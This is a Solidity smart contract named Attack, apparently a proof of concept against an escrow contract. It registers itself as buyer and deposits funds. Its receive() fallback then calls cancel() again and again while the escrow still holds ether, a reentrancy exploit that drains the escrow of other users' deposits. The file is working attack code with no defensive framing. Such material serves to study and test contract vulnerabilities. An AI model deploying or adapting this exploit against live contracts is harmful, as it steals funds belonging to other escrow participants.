// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;


interface IEscrow {
    function newEscrow(
        address buyer, 
        address seller, 
        address arbiter, 
        uint256 itemId, 
        uint256 price
    ) external;
    function deposit(uint256 itemId) external payable;
    function cancel(uint itemId) external;
}


contract Attack {

    IEscrow public escrow;
    uint256 itemId;
    bool private hasInitializedEscrow;
    //bool hasReentered;

    constructor(address _escrowAddr, uint256 _itemId) payable {
        escrow = IEscrow(_escrowAddr);
        itemId = _itemId;
    }

    function initializeEscrow(
        address seller, 
        address arbiter, 
        uint256 price, 
        uint256 depositAmount
    ) external {
        
        escrow.newEscrow(address(this), seller, arbiter, itemId, price);

        escrow.deposit{value: depositAmount}(itemId);
        hasInitializedEscrow = true;
    }

    function attack() external payable {

        escrow.cancel(itemId);
    }

    receive() external payable {

        if(address(escrow).balance > 0 ether && hasInitializedEscrow) {
            escrow.cancel(itemId);
        }
    }
}